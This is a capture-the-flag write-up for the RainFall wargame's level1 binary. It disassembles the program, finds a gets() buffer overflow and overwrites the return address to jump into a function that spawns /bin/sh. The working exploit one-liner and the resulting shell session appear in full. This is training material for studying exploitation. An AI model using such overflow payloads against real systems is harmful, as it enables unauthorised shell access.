# leve02

In this level, we are greeted with a 32-bit ELF *static* executable binary with symbols not stripped.

Static analysis using `objdump` reveals that there is a strange `run` function :

```text
08048444 <run>:
 8048444:	55                   	push   ebp
 8048445:	89 e5                	mov    ebp,esp
 8048447:	83 ec 18             	sub    esp,0x18
 804844a:	a1 c0 97 04 08       	mov    eax,ds:0x80497c0
 804844f:	89 c2                	mov    edx,eax
 8048451:	b8 70 85 04 08       	mov    eax,0x8048570
 8048456:	89 54 24 0c          	mov    DWORD PTR [esp+0xc],edx
 804845a:	c7 44 24 08 13 00 00 	mov    DWORD PTR [esp+0x8],0x13
 8048461:	00 
 8048462:	c7 44 24 04 01 00 00 	mov    DWORD PTR [esp+0x4],0x1
 8048469:	00 
 804846a:	89 04 24             	mov    DWORD PTR [esp],eax
 804846d:	e8 de fe ff ff       	call   8048350 <fwrite@plt>
 8048472:	c7 04 24 84 85 04 08 	mov    DWORD PTR [esp],0x8048584
 8048479:	e8 e2 fe ff ff       	call   8048360 <system@plt>
 804847e:	c9                   	leave  
 804847f:	c3                   	ret    
```

This function gives us access to the shell. The address `0x8048584` is pointing to a read-only string `/bin/sh`. We somehow needs to execute this function.

The `main` function is just a really simple program :

```
08048480 <main>:
 8048480:	55                   	push   ebp
 8048481:	89 e5                	mov    ebp,esp
 8048483:	83 e4 f0             	and    esp,0xfffffff0
 8048486:	83 ec 50             	sub    esp,0x50
 8048489:	8d 44 24 10          	lea    eax,[esp+0x10]
 804848d:	89 04 24             	mov    DWORD PTR [esp],eax
 8048490:	e8 ab fe ff ff       	call   8048340 <gets@plt>
 8048495:	c9                   	leave  
 8048496:	c3                   	ret    
```

First, it aligns the stack on a 16 byte boundary, and allocates `0x50` bytes, probably a buffer. It makes a call to `gets`, which is an especially unsafe C library function that is prone to **buffer overflow**, since it does not do any bounds checking on the buffer.

Given the fact that we have to find a way to execute the `run` function, we could overwrite the return address of the  `main` function to point to the `run ` function using a **buffer overflow**.

In a C program linked with the C Standard Library, `main` is **not** the entry point of an executable. In short, it is called by the C library initialization routine : this is why we overwrite the return address that has been pushed to the stack.

First thing to do is to fill the buffer entirely until we hit a segfault : we will know that we have reach the return address location.

```bash
python -c 'print("a"*76)' | ./level1
```

By trial and error, we start to get `Segmentation Fault` when going over 76 characters (eq. 76 bytes), this means we have touched the return address stored in the stack. Now we have to feed it the entry point of the `run` function, which is `0x08048444`. We are on a **little-endian** architecture, so we need to send the input in **reverse** (*least significant byte first*) :

```bash
python -c 'print("a"*76 + "\x44\x84\x04\x08")' | ./level1
```

We get a message :

```bash
Good... Wait what?
Segmentation Fault
```

Ok. So it seems we intended our goal : reaching the `run` function. But it segfault ! We do not have access to the shell ! The reason is simple : we used a pipe to inject our payload which immediately close the standard input of the `level1` program. When `system` launch `sh`, the standard input is closed and then **exit immediately**.
Since we manually modified the stack, the `ret` instruction is setting `eip` to `0x00000000`, and segfault.

The trick is to left open the standard input by using a second command in the chain : `cat`.

```bash
level1@RainFall:~$ (python -c 'print("a"*76 + "\x44\x84\x04\x08")'; cat) | ./level1
Good... Wait what?
whoami
level2
cd ../level2
ls -la
total 17
dr-xr-x---+ 1 level2 level2   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level2 level2  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level2 level2 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2
-rw-r--r--+ 1 level2 level2   65 Sep 23  2015 .pass
-rw-r--r--  1 level2 level2  675 Apr  3  2012 .profile
cat .pass
```

Success !